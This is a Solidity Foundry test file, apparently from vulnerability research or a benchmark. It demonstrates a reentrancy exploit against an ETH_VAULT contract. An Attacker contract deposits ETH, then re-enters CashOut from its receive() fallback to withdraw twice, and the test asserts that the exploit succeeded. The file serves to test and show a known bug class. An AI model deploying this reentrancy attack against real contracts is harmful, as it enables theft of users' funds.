import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT, Log} from "../src/ETH_VAULT.sol";

contract TestReentrancyETH_VAULT is Test {
    ETH_VAULT public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_VAULT(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // Constrain attackVal: must be > MinDeposit (1 ether) to pass Deposit check
        // Upper bound prevents overflow issues
        vm.assume(attackVal > 1 ether && attackVal < 5 ether);

        // Fund the Victim contract with extra ETH beyond what attacker deposits
        vm.deal(address(_contractUnderTest), attackVal * 4);

        // Fund the Attacker with enough to deposit 2x attackVal
        vm.deal(address(_attacker), attackVal * 3);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 3);

        // Setup attack: attacker deposits 2x attackVal so they can withdraw attackVal twice without underflow
        uint256 depositAmount = attackVal * 2;
        _attacker.setupAttack{value: depositAmount}(attackVal);

        // Trigger the attack - will withdraw attackVal, re-enter, withdraw attackVal again
        _attacker.attack(attackVal);

        // Verify exploit succeeded (reentrancy occurred)
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_VAULT public _victim;

    uint256 public reentrancyCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = ETH_VAULT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;

        // Deposit funds into the victim contract
        // Deposit requires msg.value > MinDeposit (1 ether)
        _victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        storedAttackVal = val;

        // Call the vulnerable CashOut function
        _victim.CashOut(val);

        // Set exploitSucceeded based on reentrancy count
        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            // Re-enter the victim's CashOut function before balance is updated
            _victim.CashOut(storedAttackVal);
        }
    }
}
